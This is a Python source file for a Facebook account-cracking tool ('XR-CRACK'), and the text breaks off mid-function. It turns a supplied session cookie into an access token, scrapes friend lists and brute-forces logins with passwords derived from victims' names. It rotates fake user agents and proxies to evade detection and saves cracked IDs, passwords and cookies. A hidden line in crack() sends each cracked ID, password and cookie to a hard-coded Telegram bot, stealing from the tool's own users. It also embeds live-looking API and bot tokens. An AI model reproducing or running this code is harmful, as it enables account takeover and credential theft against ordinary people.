

#-----------------[ IMPORT-MODULE ]-------------------#

import requests,bs4,json,os,sys,random,datetime,time,re

import urllib3,rich,base64

from rich.table import Table as me

from rich.console import Console as sol

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup as parser

from concurrent.futures import ThreadPoolExecutor as tred

from rich.console import Group as gp

from rich.panel import Panel as nel

from rich import print as cetak

from rich.markdown import Markdown as mark

from rich.columns import Columns as col

from rich import print as rprint

from rich import pretty

from rich.text import Text as tekz

try:

        import rich

except ImportError:

        cetak(nel('\t• Sedang Menginstall Modul Rich •'))

        os.system('pip install rich')

try:

        import stdiomask

except ImportError:

        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))

        os.system('pip install stdiomask')

try:

	import requests

except ImportError:

	cetak(nel('\t• Sedang Menginstall Modul Requests •'))

	os.system('pip install requests && pip install mechanize ')

#------------------[ USER-AGENT ]-------------------#

pretty.install()

CON=sol()

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

	open('.prox.txt','w').write(prox)

except Exception as e:

	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAKA_AKA_xy')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

	a='Mozilla/5.0 (Symbian/3; Series60/'

	b=random.randrange(1, 9)

	c=random.randrange(1, 9)

	d='Nokia'

	e=random.randrange(100, 9999)

	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

	g=random.randrange(1, 9)

	h=random.randrange(1, 4)

	i=random.randrange(1, 4)

	j=random.randrange(1, 4)

	k='Mobile Safari/535.1'

	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

	ugen2.append(uaku)





	aa='Mozilla/5.0 (By1551_TEAM; U; Android'

	b=random.choice(['6','7','8','9','10','11','12'])

	c='SM-M515F)'

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.randrange(1, 999)

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125'

	h=random.randrange(73,104)

	i='0'

	j=random.randrange(4200,4900)

	k=random.randrange(40,150)

	l='Mobile Safari/537.36 OPR/70.0.3653.66031'

	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

	ugen.append(uaku2)

for x in range(10):

	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-'

	b=random.randrange(100, 9999)

	c=random.randrange(100, 9999)

	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

	h=random.randrange(1, 9)

	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'

	j=random.randrange(1, 9)

	k=random.randrange(1, 9)

	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'

	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

def uaku():

	try:

		ua=open('useragent_rr.txt','r').read().splitlines()

		for ub in ua:

			ugen.append(ub)

	except:

		a=requests.get('https://github.com/Al-Vino/cracking9/blob/Default/asset/useragent_rr.txt').text

		ua=open('.useragent_rr.txt','w')

		aa=re.findall('line">(.*?)<',str(a))

		for un in aa:

			ua.write(un+'\n')

		ua=open('.useragent_rr.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

cokbrut=[]

pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

P = '\x1b[1;97m' # DEFAULT

M = '\x1b[1;91m' # DEFAULT

H = '\x1b[1;92m' # DEFAULT

K = '\x1b[1;93m' # DEFAULT

B = '\x1b[1;94m' # DEFAULT

U = '\x1b[1;95m' # DEFAULT

O = '\x1b[1;96m' # DEFAULT

N = '\x1b[0m'    

Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;91m' # DEFAULT +

k = '\033[93m' # DEFAULT +

h = '\x1b[1;92m' # DEFAULT +

hh = '\033[32m' # DEFAULT -

u = '\033[95m' # DEFAULT

kk = '\033[33m' # DEFAULT -

b = '\33[1;96m' # DEFAULT -

p = '\x1b[0;34m' # DEFAULT +

asu = random.choice([m,k,h,u,b])

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}

dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

#------------------[ MACHINE-SUPPORT ]---------------#

def by_1551(u):

        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)

def clear():

	os.system('clear')

def back():

	login()

#------------------[ LOGO-LAKNAT ]-----------------#

def by_1551(u):

        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)

def clear():

	os.system('clear')

def back():

	login()

def banner():

	clear()

	by_1551(f"""\t{B}



, ＜￣｀ヽ、　　　　　　／￣＞



　ゝ、　　＼　／⌒ヽ,ノ 　/´



　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／

　　 　　>　 　 　,)

　　　　　∠_,,,/



                             CODE BY  : PATRICK

                             Telegram : @X9_8L

                             CHANAL   : https://t.me/hack_pubg_vip13

                             Team     : 13 

                             Version  : 7.1

                             

                             

 ╔╦══• •✠•❀ XR-CRACK ❀•✠ • •══╦╗

 ╚╩══• •✠•❀ XR-CRACK ❀•✠ • •══╩╝



--------------------------------------------------------------------------

🎀  Don't Minimize When Clonning 

--------------------------------------------------------------------------



	

--------------------------------------------------------------------------

 FOR BUY CHAT FOR OWNER

--------------------------------------------------------------------------





""")

#--------------------[ BAGIAN-MASUK ]--------------#

def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = ' ╰─  Bbura barez Keshaka La Xatakaya '

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		login_lagi334()

		

def login_lagi334():

	try:

		banner()

		your_cookies = input(' YOUR COOKIE : ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" ╰─  Cookie Swtawa...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n YOUR TOKEN : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)

							print("\n ᳀ LOGIN SUCESSFULL ᳀ ");exit()

			except Exception as e:

				print(" ᳀ YOUR TOKEN ᳀ ")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass

#------------------[ BAGIAN-MENU ]----------------#

def menu(NAME,ID):

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		print('[×] Cookies Kadaluarsa ')

		time.sleep(5)

		login_lagi334()

	banner()

	ip = requests.get("https://api.ipify.org").text

# gh = 'github.com/Al-Vino'

# print(f'>> Github   : {gh}')

	

	print('''

 

 [1] WITH PUBLIC/MULTYPLY 

 [2] WITH FILE CLONE 

 [0] WITH DELET {COOKIE} 

 

''')

	_____WOLF__WOLF_____ = input('\n INPUT NUMBER : ')

	if _____WOLF__WOLF_____ in ['1']:

		dump_massal()

	elif _____WOLF__WOLF_____ in ['4']:

		dump_follower()

	elif _____WOLF__WOLF_____ in ['3']:

		grup()

	elif _____WOLF__WOLF_____ in ['2']:

		crack_file()

	elif _____WOLF__WOLF_____ in ['5']:

		result()

	elif _____WOLF__WOLF_____ in ['0']:

		os.system('rm -rf .token.txt')

		os.system('rm -rf .cookie.txt')

		print('<•> Sukses Logout+Hapus Kukis ')

		exit()

	else:

		print('<•> Pilih Yang Bener Tod ')

		back()

def error():

	print(f'{k}<•> Maaf Fitur Ini Masih Di Perbaiki {x}')

	time.sleep(4)

	back()

#-----------------[ HASIL-CRACK ]-----------------#

def result():

	print(f'<•> 1. Hasil {h}OK{x} Anda ')

	print(f'<•> 2. Hasil {k}CP{x} Anda ')

	print('<•> 3. Kembali	')

	kz = input(f'\nchoice : ')

	if kz in ['2']:

		try:vin = os.listdir('CP')

		except FileNotFoundError:

			print('<•> File Tidak Di Temukan ')

			time.sleep(3)

			back()

		if len(vin)==0:

			print('<•> Anda Tidak Memiliki Hasil CP ')

			time.sleep(2)

			back()

		else:

			cih = 0

			lol = {}

			for isi in vin:

				try:hem = open('CP/'+isi,'r').readlines()

				except:continue

				cih+=1

				if cih<10:

					nom = ''+str(cih)

					lol.update({str(cih):str(isi)})

					lol.update({nom:str(isi)})

					print(f'<•> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))

				else:

					lol.update({str(cih):str(isi)})

					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)

			geeh = input('\nchoice : ')

			try:geh = lol[geeh]

			except KeyError:

				print('<•> Pilih Yang Bener Kontol ')

				back()

			try:lin = open('CP/'+geh,'r').read().splitlines()

			except:

				print('<•> File Tidak Di Temukan ')

				time.sleep(2)

				back()

			nocp=0

			for cpku in range(len(lin)):

				cpkuni=lin[nocp].split('|')

				print(f'{x}<•> {k}{cpkuni[0]}|{cpkuni[1]}')

				nocp +=1

			print('')

			input(f'{x}[{m} Klik Enter{x} ]')

			back()

	elif kz in ['1']:

		try:vin = os.listdir('OK')

		except FileNotFoundError:

			print('<•> File Tidak Di Temukan ')

			time.sleep(2)

			back()

		if len(vin)==0:

			print('<•> Anda Tidak Mempunyai File OK ')

			time.sleep(2)

			back()

		else:

			cih = 0

			lol = {}

			for isi in vin:

				try:hem = open('OK/'+isi,'r').readlines()

				except:continue

				cih+=1

				if cih<10:

					nom = '0'+str(cih)

					lol.update({str(cih):str(isi)})

					lol.update({nom:str(isi)})

					print(f'<•> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))

				else:

					lol.update({str(cih):str(isi)})

					print(f'<•> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))

			geeh = input(f'\nPilih : ')

			try:geh = lol[geeh]

			except KeyError:

				print('<•> Pilih Yang Bener Kontol ')

				back()

			try:lin = open('OK/'+geh,'r').read().splitlines()

			except:

				print('<•> File Tidak Di Temukan ')

				time.sleep(2)

				back()

			nocp=0

			for cpku in range(len(lin)):

				cpkuni=lin[nocp].split('|')

				print('')

				print(f'{x}<•> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')

				nocp +=1

			print('')

			input(f'{x}[{m} Klik Enter{x} ]')

			back()

	elif kz in ['3']:

		back()

	else:

		print('<•> Pilih Yang Bener Kontol ')

		back()

#-------------------[ CRACK-PUBLIK ]----------------#

def dump_massal():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

	except IOError:

		exit()

	try:

		jum = int(input(' HOW MUCH TARGET : '))

	except ValueError:

		print('<•> Masukkan Angka Anjing, Malah Huruff ')

		exit()

	if jum<1 or jum>100:

		print('<•> Gagal Dump Idz ')

		exit()

	ses=requests.Session()

	yz = 0

	for met in range(jum):

		yz+=1

		kl = input(' PASTE ID '+str(yz)+' : ')

		uid.append(kl)

	for userr in uid:

		try:

			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()

			for mi in col['friends']['data']:

				try:

					iso = (mi['id']+'|'+mi['name'])

					if iso in id:pass

					else:id.append(iso)

				except:continue

		except (KeyError,IOError):

			pass

		except requests.exceptions.ConnectionError:

			print('<•> Sinyal Loh Kek Kontoll ')

			exit()

	try:

		print('')

		print(f' COLECTED ID : {h}'+str(len(id)))

		setting()

	except requests.exceptions.ConnectionError:

		print(f'{x}')

		print('<•> Sinyal Lo kek Kontol ')

		back()

	except (KeyError,IOError):

		print(f'<•>{k} Pertemanan Tidak Public {x}')

		time.sleep(3)

		back()

#--------------[ CRACK FAILL ]--------------------#

def crack_file():



	





    

	o = input(' INPUT FILE CLONE : ')



	print('')



	try:lin = open(o).read().splitlines()



	except:



		print('File Not Found')



		time.sleep(2)



		menu()



	for xid in lin:



		id.append(xid)



	setting()



#-------------[ PENGATURAN-IDZ ]---------------#

def setting():

	print(f'''{k}

 

 [3] WITH RANDOM FB 

 

''')

	hu = input(' INPUT N ')

	if hu in ['2','02']:

		for tua in sorted(id):

			id2.append(tua)



	elif hu in ['3','03']:

		muda=[]

		for bacot in sorted(id):

			muda.append(bacot)

		bcm=len(muda)

		bcmi=(bcm-1)

		for xmud in range(bcm):

			id2.append(muda[bcmi])

			bcmi -=1

	elif hu in ['3','03']:

		for bacot in id:

			xx = random.randint(0,len(id2))

			id2.insert(xx,bacot)

	else:

		print('<•> Pilih Yang Bener Kontooll ')

		exit()

	print(f'''{b}

 [1] Mobile/Facebook.com

 

''')

	hc = input(' INPUT NUMBER : ')

	if hc in ['1','01']:

		method.append('mobile')

	elif hc in ['']:

		print('<•> Pilih Yang Bener Kontol ')

		setting()

	elif hc in ['2','02']:

		method.append('free')

	elif hc in ['3','03']:

		method.append('touch')

	elif hc in ['4','04']:

		method.append('mbasic')

	else:

		method.append('mobile')

	print('')

	pwplus=input(' Auto Pass [t] : ')

	if pwplus in ['y','Y']:

		pwpluss.append('ya')

		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))

		pwku=input('<•> Masukkan Password Tambahan : ')

		pwkuh=pwku.split(',')

		for xpw in pwkuh:

			pwnya.append(xpw)

	else:

		pwpluss.append('no')

	passwrd()

#-------------------[ BAGIAN-WORDLIST ]------------#

def passwrd():

	print(f'{H} .')

	with tred(max_workers=30) as pool:

		for yuzong in id2:

			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()

			frs = nmf.split(' ')[0]

			pwv = []

			if len(nmf)<6:

				if len(frs)<3:

					pass

				else:

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

					pwv.append(frs+'123456')

					pwv.append(frs+'123456789')

					pwv.append(frs+'1234567890')

					pwv.append(frs+'12')

					pwv.append(frs+'1122')

					pwv.append(frs+'321')

					pwv.append(frs+'54321')

					pwv.append(frs+'4321')

					pwv.append(frs+'2006')

					pwv.append(frs+'2005')

					pwv.append(frs+'2004')

					pwv.append(frs+'2003')

					pwv.append(frs+'2002')

					pwv.append(frs+'2022')

					pwv.append(frs+'2023')

					pwv.append('123'+frs+'123')

					pwv.append('1234'+frs+'1234')

					pwv.append('12345'+frs+'12345')

					pwv.append('123'+frs)

					pwv.append('1234'+frs)

					pwv.append('12345'+frs)

			else:

				if len(frs)<3:

					pwv.append(nmf)

				else:

					pwv.append(nmf)

					pwv.append(frs+'123')

					pwv.append(frs+'1234')

					pwv.append(frs+'12345')

					pwv.append(frs+'123456')

					pwv.append(frs+'123456789')

					pwv.append(frs+'1234567890')

					pwv.append(frs+'12')

					pwv.append(frs+'1122')

					pwv.append(frs+'321')

					pwv.append(frs+'54321')

					pwv.append(frs+'4321')

					pwv.append(frs+'2006')

					pwv.append(frs+'2005')

					pwv.append(frs+'2004')

					pwv.append(frs+'2003')

					pwv.append(frs+'2002')

					pwv.append(frs+'2022')

					pwv.append(frs+'2023')

					pwv.append('123'+frs+'123')

					pwv.append('1234'+frs+'1234')

					pwv.append('12345'+frs+'12345')

					pwv.append('123'+frs)

					pwv.append('1234'+frs)

					pwv.append('12345'+frs)

			if 'ya' in pwpluss:

				for xpwd in pwnya:

					pwv.append(xpwd)

			else:pass

			if 'mobile' in method:

				pool.submit(crack,idf,pwv)

			elif 'free' in method:

				pool.submit(crackfree,idf,pwv)

			elif 'touch' in method:

				pool.submit(cracktouch,idf,pwv)

			elif 'mbasic' in method:

				pool.submit(crackmbasic,idf,pwv)

			else:

				pool.submit(crackmbasic,idf,pwv)

	print('WOLF')

	print(f' {h} WOLF LIVE : {h}%s '%(ok))

	print(f' {k} WOLF CHEK : {k}%s{x} '%(cp))

	print(' ✶⊶⊷⊶⊷❍ - ❍⊶⊷⊶⊷✶ ')

	print('')

	print(' CRACK REFRESH ( Y/t ) ? ')

	woi = input(' 𝗣𝗜𝗟𝗜𝗛 : ')

	if woi in ['y','Y']:

		back()

	else:

		print(f'\t{k} Good Bye {x} ')

		time.sleep(2)

		exit()

#--------------------[ METODE-B-API ]-----------------#

def crack(idf,pwv):

	global loop,ok,cp

	bo = random.choice([m,k,h,b,u,x])

	sys.stdout.write(f"\r{Z} TESTED {P} {Z} ∼ {Z}{loop}{Z}/{Z}{len(id)}{Z} ∼ ∎ {Z} {H} GOOD : {ok}{Z} ∎ {K} BAD × {cp}{Z} × {bo}{'{:.0%}'.format(loop/float(len(id)))}{Z} "),

	sys.stdout.flush()

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	for pw in pwv:

		try:

			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})

			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}

			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)

			if "checkpoint" in po.cookies.get_dict().keys():

				print(f'\r{M} WOLF CHECK ≎ \n{M} USER - ID 📎 : {K}{idf}\n{M} PASS 🗝 : {K}{pw}\n{M} USERAGENT 🪧 : {K}{ua} {N}')     

				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')

				akun.append(idf+'|'+pw)

				cp+=1

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				ok+=1

				coki=po.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

				print(f'\r{x}{b} | {H}{idf} \n{b} | {H} {pw} \n{b} | {H} {year} ')

				requests.get(f"https://api.telegram.org/bot5920991235:AAFLk7Qd5vIe4ywO3XXqw_bbgHKPiWoFCMw/sendMessage?chat_id=5665425268&text {year} | {idf} | {pw} | {kuki} ")

				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')

				cek_apk(session,coki)

				break

				

			else:

				continue

		except requests.exceptions.ConnectionError:

			time.sleep(31)

	loop+=1

#------------------[ METHODE-MBASIC-2 ]-------------------#

def cracktouch(idf,pwv):

	global loop,ok,cp

	bi = random.choice([u,k,kk,b,h,hh])

	pers = loop*100/len(id2)

	fff = '%'

	nip=random.choice(prox)

	proxs= {'http': 'socks5://'+nip}

	ua = random.choice(ugen)

	ua2 = random.choice(ugen2)

	ses = requests.Session()

	sys.stdout.write(f"\r{x}[{h}+{x}]{k} ╰─>{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),

	for pw in pwv:

		try:

			ses.headers.update({'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})

			p = ses.get('https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')

			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}

			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])

			koki+=' m_pixel_ratio=2.625; wd=412x756'

			heade={'Host': 'touch.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}

			po = ses.post('https://touch.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)

			if "checkpoint" in po.cookies.get_dict().keys():

				if 'ya' in oprek:

					akun.append(idf+'|'+pw)

					ceker(idf,pw)

				elif 'ya' in princp:

					print('\n')

					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'

					statuscp1 = nel(statuscp, style='red')

					cetak(nel(statuscp1, title='AOREC-XD CP'))

					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')

					akun.append(idf+'|'+pw)

					cp+=1

				else:continue

				break

			elif "c_user" in ses.cookies.get_dict().keys():

				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (By1551_TEAM; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}

				if 'no' in taplikasi:

					coki=po.cookies.get_dict()

					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])

					open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')

					print('\n')

					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'

					statusok1 = nel(statusok, style='green')

					cetak(nel(statusok1, title='AOREC-XD OK'))

					ok+=1

					break

